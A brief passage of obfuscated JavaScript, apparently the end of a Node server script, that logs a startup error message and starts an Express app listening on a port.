_0x46e8b9=_0x4371a9;console[_0x46e8b9(0x1f0)]('Unhandled\x20error\x20in\x20startserver:',_0x4c17a4);}),app['listen'](PORT,()=>console[_0x4371a9(0x1fc)](_0x4371a9(0x194)+PORT+'!'));
